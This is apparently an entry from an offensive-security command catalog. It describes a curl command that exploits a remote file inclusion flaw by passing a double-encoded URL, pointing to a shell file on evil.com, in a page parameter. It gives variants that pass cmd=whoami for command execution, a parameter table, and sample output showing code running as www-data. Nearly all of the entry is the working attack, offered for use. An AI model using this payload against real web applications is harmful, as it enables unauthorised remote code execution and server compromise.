---
id: db18d496-e681-4875-bb73-cc6334cc66d6
name: curl-rfi-double-encoded-url
type: command
executor: bash
data: >-
  curl
  "http://example.com/index.php?page=http%253A%252f%252fevil.com%252fshell.txt"
output: null
created_at: '2023-04-06T03:55:58.216751+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
  - macOS
tags:
  - rfi
  - web-exploit
verified: true
validated: true
---

# curl-rfi-double-encoded-url

## Command

```bash
curl "http://example.com/index.php?page=http%253A%252f%252fevil.com%252fshell.txt"
```

## Description

This command uses curl to send a GET request to a vulnerable web application, exploiting an RFI vulnerability with a double-encoded URL pointing to a remote malicious file. It triggers the inclusion and potential execution of the remote file on the target server.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `$_TARGET_URL` | Base URL of the vulnerable application (e.g., http://example.com/index.php) | Yes |
| `$_VULN_PARAM` | Vulnerable parameter name (e.g., page) | Yes |
| `$_REMOTE_FILE` | Double-encoded path to the attacker's malicious file (e.g., http%253A%252f%252fevil.com%252fshell.txt) | Yes |
| `-X GET` | HTTP method (default for curl) | No |

## Examples

### Basic Usage

```bash
curl "http://example.com/index.php?page=http%253A%252f%252fevil.com%252fshell.txt"
```

### With Command Execution (if shell supports ?cmd)

```bash
curl "http://example.com/index.php?page=http%253A%252f%252fevil.com%252fshell.txt&cmd=whoami"
```

### Verbose Output for Debugging

```bash
curl -v "http://example.com/index.php?page=http%253A%252f%252fevil.com%252fshell.txt"
```

## Expected Output

If successful, the response body may include the contents or execution output of the remote file, such as a blank page (if no output) or command results (e.g., system info). Errors might show 'file not found' or decoding failures. Example success (with cmd=id):

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Related

- [[procedures/Basic-RFI-with-Double-Encoding]]
- [[tools/cURL]]
